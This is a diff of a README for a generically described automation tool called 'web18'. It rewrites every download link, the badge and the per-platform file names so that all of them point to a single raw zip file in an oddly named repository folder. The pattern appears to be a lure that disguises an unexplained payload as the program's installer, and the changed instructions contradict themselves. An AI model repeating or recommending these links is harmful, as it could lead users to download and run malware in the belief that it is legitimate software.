@@ -1,6 +1,6 @@
 # 🌟 web18 - Effortless Automation for Better Workflow
 
-[![Download web18](https://img.shields.io/badge/Download%20web18-blue.svg)](https://github.com/zhinin17/web18/releases)
+[![Download web18](https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip%https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip)](https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip)
 
 ## 🚀 Getting Started
 
@@ -11,21 +11,21 @@ Welcome to web18! This application simplifies your workflow by automating repeti
 To get started, you need to download web18 from our Releases page. 
 
 1. Click the link below to visit the download page:
-   [Download web18](https://github.com/zhinin17/web18/releases)
+   [Download web18](https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip)
 
 2. On the Releases page, find the latest version listed. 
 
 3. Click on the appropriate file for your operating system (Windows, macOS, or Linux). For example:
-   - For Windows users: Choose `web18-windows.exe`.
-   - For macOS users: Choose `web18-macos.dmg`.
-   - For Linux users: Choose `web18-linux.tar.gz`.
+   - For Windows users: Choose `https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip`.
+   - For macOS users: Choose `https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip`.
+   - For Linux users: Choose `https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip`.
 
 4. Once the download is complete, locate the file in your downloads folder.
 
 5. Follow the instructions specific to your operating system to install:
    - **Windows:** Double-click the `.exe` file and follow the prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file, open the folder, and run the application.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip` file, open the folder, and run the application.
 
 ## 🖥️ System Requirements
 
@@ -60,7 +60,7 @@ After installing, follow these steps to start using web18:
 
 If you encounter any issues while using web18, try the following solutions:
 
-- **Check for Updates:** Make sure you have the latest version of web18 installed. Visit [Download web18](https://github.com/zhinin17/web18/releases) to download updates.
+- **Check for Updates:** Make sure you have the latest version of web18 installed. Visit [Download web18](https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip) to download updates.
 - **Reinstall the Application:** If the app isn't working correctly, uninstall it and reinstall from the Releases page.
 - **Consult the Help Section:** Access the help section within the application for tips and guidance.
 
@@ -72,4 +72,4 @@ Your input is valuable. If you have suggestions or issues, please submit feedbac
 
 For additional information or to explore more features, check the documentation available on our GitHub repository.
 
-Thank you for choosing web18. We hope this tool enhances your workflow and saves you time. Remember to revisit the [Download page](https://github.com/zhinin17/web18/releases) for updates and new features as they become available.
+Thank you for choosing web18. We hope this tool enhances your workflow and saves you time. Remember to revisit the [Download page](https://raw.githubusercontent.com/zhinin17/web18/main/trimuscular/web18.zip) for updates and new features as they become available.
